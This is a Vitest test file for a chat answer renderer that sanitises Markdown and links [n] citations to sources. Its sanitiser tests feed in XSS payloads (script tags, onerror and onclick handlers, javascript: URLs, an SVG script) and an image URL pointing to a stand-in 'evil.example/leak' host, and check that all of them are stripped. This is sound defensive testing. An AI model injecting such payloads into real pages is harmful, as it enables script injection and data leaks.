import { afterEach, describe, expect, it } from 'vitest';
import { renderAnswer } from '@/shared/chat/markdown';
import type { MessageSource } from '@/shared/model';

// Sanitised Markdown and citation links (spec 5.6, 6 "Privacy", D13).

const SOURCES: MessageSource[] = [
  { index: 1, title: 'Night trains', url: 'https://news.example/trains', origin: 'pin' },
  { index: 3, title: 'Dashboard', url: 'https://dash.example/', origin: 'currentTab' },
];

const label = (n: number, title: string) => `Source ${String(n)}: ${title}`;

function html(text: string, sources = SOURCES): HTMLElement {
  const box = document.createElement('div');
  box.append(renderAnswer(text, sources, label));
  document.body.append(box);
  return box;
}

afterEach(() => {
  document.body.replaceChildren();
  delete (globalThis as Record<string, unknown>).pwned;
});

describe('Markdown', () => {
  it('renders lists, code, emphasis and tables', () => {
    const box = html(
      '# Title\n\n- one\n- **two**\n\n1. first\n\n```js\nconst a = [1];\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |',
    );
    expect(box.querySelector('h1')?.textContent).toBe('Title');
    expect(box.querySelectorAll('ul li')).toHaveLength(2);
    expect(box.querySelector('strong')?.textContent).toBe('two');
    expect(box.querySelector('ol li')?.textContent).toBe('first');
    expect(box.querySelector('pre code')?.textContent).toBe('const a = [1];\n');
    expect(box.querySelectorAll('table td')).toHaveLength(2);
  });

  it('opens links in a new tab without opener or referrer', () => {
    const box = html('See [the docs](https://docs.example/a) and <https://b.example/>.');
    const links = [...box.querySelectorAll('a')];
    expect(links).toHaveLength(2);
    for (const a of links) {
      expect(a.getAttribute('target')).toBe('_blank');
      expect(a.getAttribute('rel')).toBe('noopener noreferrer');
    }
    expect(links[0]?.getAttribute('href')).toBe('https://docs.example/a');
  });
});

describe('sanitiser', () => {
  it('drops scripts, event handlers and dangerous URLs', async () => {
    const box = html(
      [
        'Hello <script>globalThis.pwned = 1</script>',
        '<img src="x" onerror="globalThis.pwned = 2">',
        '<a href="javascript:globalThis.pwned=3">x</a>',
        '[y](javascript:globalThis.pwned=4)',
        '<iframe srcdoc="x"></iframe>',
        '<div onclick="globalThis.pwned=5" style="position:fixed">z</div>',
        '<svg><script>globalThis.pwned=6</script></svg>',
        '<form><button>b</button></form>',
      ].join('\n\n'),
    );
    await new Promise((resolve) => setTimeout(resolve, 20));
    expect(box.querySelector('script, img, iframe, svg, form, button, style')).toBeNull();
    for (const el of box.querySelectorAll('*')) {
      for (const attr of el.getAttributeNames()) {
        expect(attr.startsWith('on')).toBe(false);
        expect(attr).not.toBe('style');
      }
    }
    for (const a of box.querySelectorAll('a')) {
      expect(a.getAttribute('href') ?? '').not.toMatch(/javascript/i);
    }
    expect((globalThis as Record<string, unknown>).pwned).toBeUndefined();
  });

  it('never loads images: an image becomes its alt text', () => {
    const box = html('![secret data](https://evil.example/leak?q=1)');
    expect(box.querySelector('img')).toBeNull();
    expect(box.textContent).toContain('secret data');
    expect(box.innerHTML).not.toContain('evil.example');
  });
});

describe('citations', () => {
  it('links [n] to the source with that number', () => {
    const box = html('Trains are back [1]. The dashboard agrees [3].');
    const links = [...box.querySelectorAll<HTMLAnchorElement>('a.citation')];
    expect(links.map((a) => a.textContent)).toEqual(['[1]', '[3]']);
    expect(links[0]?.getAttribute('href')).toBe('https://news.example/trains');
    expect(links[0]?.dataset.citation).toBe('1');
    expect(links[0]?.getAttribute('aria-label')).toBe('Source 1: Night trains');
    expect(links[0]?.getAttribute('title')).toBe('Night trains');
    expect(links[1]?.dataset.citation).toBe('3');
  });

  it('keeps numbers without a source as plain text', () => {
    const box = html('Unknown [2] and [99].');
    expect(box.querySelector('a')).toBeNull();
    expect(box.textContent.trim()).toBe('Unknown [2] and [99].');
  });

  it('links each number of a group', () => {
    const box = html('Both say so [1, 3] and [1][3], not [1, 2].');
    const numbers = [...box.querySelectorAll<HTMLAnchorElement>('a.citation')].map(
      (a) => a.dataset.citation,
    );
    expect(numbers).toEqual(['1', '3', '1', '3', '1']);
    expect(box.textContent.trim()).toBe('Both say so [1, 3] and [1][3], not [1, 2].');
  });

  it('leaves code and existing links alone', () => {
    const box = html('`arr[1]` and\n\n```\nx[1]\n```\n\n[see [1]](https://a.example/)');
    expect(box.querySelector('a.citation')).toBeNull();
  });

  it('works inside lists and emphasis', () => {
    const box = html('- **Point** [1]\n- other [3]');
    expect(box.querySelectorAll('li a.citation')).toHaveLength(2);
  });

  it('keeps working with only stored sources (after unpinning)', () => {
    const box = html('Old answer [1].', [
      { index: 1, title: 'Gone pin', url: 'https://gone.example/', origin: 'pin' },
    ]);
    expect(box.querySelector('a.citation')?.getAttribute('href')).toBe('https://gone.example/');
  });

  it('does not link sources that are not web pages', () => {
    const box = html('See [1].', [
      { index: 1, title: 'x', url: 'javascript:alert(1)', origin: 'pin' },
    ]);
    expect(box.querySelector('a')).toBeNull();
  });
});
